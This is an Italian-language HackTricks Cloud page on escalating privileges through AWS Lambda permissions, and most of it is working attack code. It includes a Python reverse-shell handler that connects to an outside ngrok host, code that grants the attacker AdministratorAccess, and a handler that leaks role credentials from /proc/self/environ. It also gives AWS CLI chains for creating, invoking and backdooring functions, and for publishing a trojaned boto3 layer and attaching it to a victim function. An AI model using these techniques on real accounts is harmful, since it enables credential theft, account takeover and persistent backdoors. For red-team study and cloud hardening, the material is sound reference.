# AWS - Lambda Privesc

<details>

<summary><strong>Impara l'hacking AWS da zero a esperto con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Esperto Red Team AWS di HackTricks)</strong></a><strong>!</strong></summary>

Altri modi per supportare HackTricks:

* Se vuoi vedere la tua **azienda pubblicizzata su HackTricks** o **scaricare HackTricks in PDF** Controlla i [**PIANI DI ABBONAMENTO**](https://github.com/sponsors/carlospolop)!
* Ottieni il [**merchandising ufficiale PEASS & HackTricks**](https://peass.creator-spring.com)
* Scopri [**La Famiglia PEASS**](https://opensea.io/collection/the-peass-family), la nostra collezione di [**NFT esclusivi**](https://opensea.io/collection/the-peass-family)
* **Unisciti al** üí¨ [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo telegram**](https://t.me/peass) o **seguici** su **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Condividi i tuoi trucchi di hacking inviando PR a** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>

## lambda

Maggiori informazioni su lambda in:

{% content-ref url="../../aws-security/aws-services/aws-lambda-enum.md" %}
[aws-lambda-enum.md](../../aws-security/aws-services/aws-lambda-enum.md)
{% endcontent-ref %}

### `iam:PassRole`, `lambda:CreateFunction`, (`lambda:InvokeFunction` | `lambda:InvokeFunctionUrl`)

Gli utenti con le autorizzazioni **`iam:PassRole`, `lambda:CreateFunction`, e `lambda:InvokeFunction`** possono elevare i propri privilegi.\
Possono **creare una nuova funzione Lambda e assegnarle un ruolo IAM esistente**, concedendo alla funzione le autorizzazioni associate a quel ruolo. L'utente pu√≤ quindi **scrivere e caricare codice in questa funzione Lambda (ad esempio un reverse shell)**.\
Una volta configurata la funzione, l'utente pu√≤ **attivare la sua esecuzione** e le azioni previste invocando la funzione Lambda tramite l'API AWS. Questo approccio consente efficacemente all'utente di eseguire attivit√† in modo indiretto attraverso la funzione Lambda, operando con il livello di accesso concesso al ruolo IAM associato ad essa.\\

Un attaccante potrebbe sfruttare ci√≤ per ottenere una **reverse shell e rubare il token**:

{% code title="rev.py" %}
```python
import socket,subprocess,os,time
def lambda_handler(event, context):
s = socket.socket(socket.AF_INET,socket.SOCK_STREAM);
s.connect(('4.tcp.ngrok.io',14305))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
p=subprocess.call(['/bin/sh','-i'])
time.sleep(900)
return 0
```
{% endcode %}
```bash
# Zip the rev shell
zip "rev.zip" "rev.py"

# Create the function
aws lambda create-function --function-name my_function \
--runtime python3.9 --role <arn_of_lambda_role> \
--handler rev.lambda_handler --zip-file fileb://rev.zip

# Invoke the function
aws lambda invoke --function-name my_function output.txt
## If you have the lambda:InvokeFunctionUrl permission you need to expose the lambda inan URL and execute it via the URL

# List roles
aws iam list-attached-user-policies --user-name <user-name>
```
Puoi anche **abusare delle autorizzazioni del ruolo lambda** dalla stessa funzione lambda.\
Se il ruolo lambda avesse abbastanza autorizzazioni, potresti usarlo per concederti i diritti di amministratore:
```python
import boto3
def lambda_handler(event, context):
client = boto3.client('iam')
response = client.attach_user_policy(
UserName='my_username',
PolicyArn='arn:aws:iam::aws:policy/AdministratorAccess'
)
return response
```
√à anche possibile rivelare le credenziali del ruolo della lambda senza necessit√† di una connessione esterna. Questo sarebbe utile per le **Lambdas isolate di rete** utilizzate per compiti interni. Se ci sono gruppi di sicurezza sconosciuti che filtrano le tue reverse shell, questo pezzo di codice ti permetter√† di rivelare direttamente le credenziali come output della lambda.
```python
def handler(event, context):
sessiontoken = open('/proc/self/environ', "r").read()
return {
'statusCode': 200,
'session': str(sessiontoken)
}
```

```bash
aws lambda invoke --function-name <lambda_name> output.txt
cat output.txt
```
**Impatto Potenziale:** Privesc diretta al ruolo di servizio lambda arbitrario specificato.

{% hint style="danger" %}
Nota che anche se potrebbe sembrare interessante **`lambda:InvokeAsync`** non consente da solo di eseguire `aws lambda invoke-async`, √® necessario anche `lambda:InvokeFunction`
{% endhint %}

### `iam:PassRole`, `lambda:CreateFunction`, `lambda:AddPermission`

Come nello scenario precedente, puoi **concederti il permesso `lambda:InvokeFunction`** se hai il permesso **`lambda:AddPermission`**
```bash
# Check the previous exploit and use the following line to grant you the invoke permissions
aws --profile "$NON_PRIV_PROFILE_USER" lambda add-permission --function-name my_function \
--action lambda:InvokeFunction --statement-id statement_privesc --principal "$NON_PRIV_PROFILE_USER_ARN"
```
**Impatto Potenziale:** Privesc diretto al ruolo di servizio lambda arbitrario specificato.

### `iam:PassRole`, `lambda:CreateFunction`, `lambda:CreateEventSourceMapping`

Gli utenti con le autorizzazioni **`iam:PassRole`, `lambda:CreateFunction`, e `lambda:CreateEventSourceMapping`** (e potenzialmente `dynamodb:PutItem` e `dynamodb:CreateTable`) possono **escalare privilegi** indirettamente anche senza `lambda:InvokeFunction`.\
Possono creare una **funzione Lambda con codice dannoso e assegnarle un ruolo IAM esistente**.

Invece di invocare direttamente la Lambda, l'utente configura o utilizza una tabella DynamoDB esistente, collegandola alla Lambda tramite un mapping della sorgente degli eventi. Questa configurazione garantisce che la funzione Lambda venga **attivata automaticamente all'ingresso di un nuovo elemento** nella tabella, sia per azione dell'utente che di un altro processo, attivando indirettamente la funzione Lambda ed eseguendo il codice con i permessi del ruolo IAM passato.
```bash
aws lambda create-function --function-name my_function \
--runtime python3.8 --role <arn_of_lambda_role> \
--handler lambda_function.lambda_handler \
--zip-file fileb://rev.zip
```
Se DynamoDB √® gi√† attivo nell'ambiente AWS, l'utente deve solo **stabilire il mapping della sorgente degli eventi** per la funzione Lambda. Tuttavia, se DynamoDB non √® in uso, l'utente deve **creare una nuova tabella** abilitando lo streaming:
```bash
aws dynamodb create-table --table-name my_table \
--attribute-definitions AttributeName=Test,AttributeType=S \
--key-schema AttributeName=Test,KeyType=HASH \
--provisioned-throughput ReadCapacityUnits=5,WriteCapacityUnits=5 \
--stream-specification StreamEnabled=true,StreamViewType=NEW_AND_OLD_IMAGES
```
Ora √® possibile **connettere la funzione Lambda alla tabella DynamoDB** creando un **mapping della sorgente degli eventi**:
```bash
aws lambda create-event-source-mapping --function-name my_function \
--event-source-arn <arn_of_dynamodb_table_stream> \
--enabled --starting-position LATEST
```
Con la funzione Lambda collegata allo stream DynamoDB, l'attaccante pu√≤ **attivare indirettamente la Lambda attivando lo stream DynamoDB**. Ci√≤ pu√≤ essere realizzato **inserendo un elemento** nella tabella DynamoDB:
```bash
aws dynamodb put-item --table-name my_table \
--item Test={S="Random string"}
```
**Impatto Potenziale:** Privesc diretto al ruolo di servizio lambda specificato.

### `lambda:AddPermission`

Un attaccante con questa autorizzazione pu√≤ **concedersi (o concedere ad altri) qualsiasi permesso** (questo genera politiche basate sulle risorse per concedere l'accesso alla risorsa):

{% code overflow="wrap" %}
```bash
# Give yourself all permissions (you could specify granular such as lambda:InvokeFunction or lambda:UpdateFunctionCode)
aws lambda add-permission --function-name <func_name> --statement-id asdasd --action '*' --principal arn:<your user arn>

# Invoke the function
aws lambda lambda invoke --function-name <func_name> /tmp/outout
```
{% endcode %}

**Impatto Potenziale:** Privesc diretto al ruolo di servizio lambda utilizzato concedendo il permesso di modificare il codice e eseguirlo.

### `lambda:AddLayerVersionPermission`

Un attaccante con questo permesso pu√≤ **concedersi (o concedere ad altri) il permesso `lambda:GetLayerVersion`**. Potrebbe accedere al layer e cercare vulnerabilit√† o informazioni sensibili.

{% code overflow="wrap" %}
```bash
# Give everyone the permission lambda:GetLayerVersion
aws lambda add-layer-version-permission --layer-name ExternalBackdoor --statement-id xaccount --version-number 1 --principal '*' --action lambda:GetLayerVersion
```
{% endcode %}

**Impatto Potenziale:** Potenziale accesso a informazioni sensibili.

### `lambda:UpdateFunctionCode`

Gli utenti che possiedono il permesso **`lambda:UpdateFunctionCode`** hanno il potenziale per **modificare il codice di una funzione Lambda esistente collegata a un ruolo IAM.**\
L'attaccante pu√≤ **modificare il codice della lambda per estrarre le credenziali IAM**.

Anche se l'attaccante potrebbe non avere la capacit√† diretta di invocare la funzione, se la funzione Lambda √® preesistente e operativa, √® probabile che venga attivata attraverso flussi di lavoro o eventi esistenti, facilitando indirettamente l'esecuzione del codice modificato.

{% code overflow="wrap" %}
```bash
# Thezip should contain the lambda code (trick: DOwnload the current one and add your code there)
aws lambda update-function-code --function-name target_function \
--zip-file fileb:///my/lambda/code/zipped.zip

# If you have invoke permissions:
aws lambda invoke --function-name my_function output.txt

# If not check if it's exposed in any URL or via an API gateway you could access
```
{% endcode %}

**Impatto Potenziale:** Privesc diretta al ruolo di servizio lambda utilizzato.

### `lambda:UpdateFunctionConfiguration`

#### Introduzione

[**Lambda Layers**](https://docs.aws.amazon.com/lambda/latest/dg/configuration-layers.html) consente di includere **codice** nella funzione lambda ma **memorizzandolo separatamente**, in modo che il codice della funzione possa rimanere piccolo e **diverse funzioni possano condividere il codice**.

All'interno di lambda √® possibile controllare i percorsi da cui il codice Python viene caricato con una funzione come la seguente:
```python
import json
import sys

def lambda_handler(event, context):
print(json.dumps(sys.path, indent=2))
```
Questi sono i percorsi:

1. /var/task
2. /opt/python/lib/python3.7/site-packages
3. /opt/python
4. /var/runtime
5. /var/lang/lib/python37.zip
6. /var/lang/lib/python3.7
7. /var/lang/lib/python3.7/lib-dynload
8. /var/lang/lib/python3.7/site-packages
9. /opt/python/lib/python3.7/site-packages
10. /opt/python

Ad esempio, la libreria boto3 viene caricata da `/var/runtime/boto3` (4a posizione).

#### Sfruttamento

√à possibile abusare dell'autorizzazione `lambda:UpdateFunctionConfiguration` per **aggiungere un nuovo layer** a una funzione lambda. Per eseguire codice arbitrario, questo layer deve contenere una **libreria che la lambda importer√†.** Se √® possibile leggere il codice della lambda, potresti trovarlo facilmente, nota anche che potrebbe essere possibile che la lambda stia **gi√† utilizzando un layer** e potresti **scaricare** il layer e **aggiungere il tuo codice** l√¨.

Ad esempio, supponiamo che la lambda stia utilizzando la libreria boto3, questo creer√† un layer locale con l'ultima versione della libreria:
```
pip3 install -t ./lambda_layer boto3
```
Puoi aprire `./lambda_layer/boto3/__init__.py` e **aggiungere il backdoor nel codice globale** (una funzione per esfiltrare credenziali o ottenere una shell inversa per esempio).

Successivamente, comprimi la directory `./lambda_layer` e **carica il nuovo strato lambda** nel tuo account (o in quello della vittima, ma potresti non avere le autorizzazioni necessarie).

Nota che devi creare una cartella python e mettere le librerie al suo interno per sovrascrivere /opt/python/boto3. Inoltre, lo strato deve essere **compatibile con la versione di python** utilizzata dalla lambda e se lo carichi nel tuo account, deve essere nella **stessa regione:**

{% code overflow="wrap" %}
```bash
aws lambda publish-layer-version --layer-name "boto3" --zip-file file://backdoor.zip --compatible-architectures "x86_64" "arm64" --compatible-runtimes "python3.9" "python3.8" "python3.7" "python3.6"
```
{% endcode %}

Ora, rendi il layer lambda caricato **accessibile da qualsiasi account**:
```bash
aws lambda add-layer-version-permission --layer-name boto3 \
--version-number 1 --statement-id public \
--action lambda:GetLayerVersion --principal *
```
E collegare il lambda layer alla funzione lambda della vittima:
```bash
aws lambda update-function-configuration \
--function-name <func-name> \
--layers arn:aws:lambda:<region>:<attacker-account-id>:layer:boto3:1 \
--timeout 300 #5min for rev shells
```
Il passo successivo sarebbe o **invocare la funzione** noi stessi se possiamo o aspettare che venga **invocata** per vie normali, che √® il metodo pi√π sicuro.

Un **modo pi√π stealth per sfruttare questa vulnerabilit√†** pu√≤ essere trovato in:

{% content-ref url="../aws-persistence/aws-lambda-persistence/aws-lambda-layers-persistence.md" %}
[aws-lambda-layers-persistence.md](../aws-persistence/aws-lambda-persistence/aws-lambda-layers-persistence.md)
{% endcontent-ref %}

**Impatto Potenziale:** Escalation diretta dei privilegi al ruolo di servizio lambda utilizzato.

### `?iam:PassRole`, `lambda:CreateFunction`, `lambda:CreateFunctionUrlConfig`, `lambda:InvokeFunctionUrl`

Forse con quei permessi sei in grado di creare una funzione ed eseguirla chiamando l'URL... ma potrei trovare un modo per testarlo, quindi fammi sapere se ci riesci!

### Lambda MitM

Alcune lambda stanno **ricevendo informazioni sensibili dagli utenti nei parametri.** Se ottieni RCE in una di esse, puoi esfiltrare le informazioni che gli altri utenti stanno inviando ad essa, controlla in:

{% content-ref url="../aws-post-exploitation/aws-lambda-post-exploitation/aws-warm-lambda-persistence.md" %}
[aws-warm-lambda-persistence.md](../aws-post-exploitation/aws-lambda-post-exploitation/aws-warm-lambda-persistence.md)
{% endcontent-ref %}

## Riferimenti

* [https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/](https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/)
* [https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation-part-2/](https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation-part-2/)

<details>

<summary><strong>Impara l'hacking AWS da zero a eroe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Altri modi per supportare HackTricks:

* Se vuoi vedere la tua **azienda pubblicizzata in HackTricks** o **scaricare HackTricks in PDF** Controlla i [**PIANI DI ABBONAMENTO**](https://github.com/sponsors/carlospolop)!
* Ottieni il [**merchandising ufficiale PEASS & HackTricks**](https://peass.creator-spring.com)
* Scopri [**The PEASS Family**](https://opensea.io/collection/the-peass-family), la nostra collezione di [**NFT esclusivi**](https://opensea.io/collection/the-peass-family)
* **Unisciti al** üí¨ [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo telegram**](https://t.me/peass) o **seguici** su **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Condividi i tuoi trucchi di hacking inviando PR ai** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
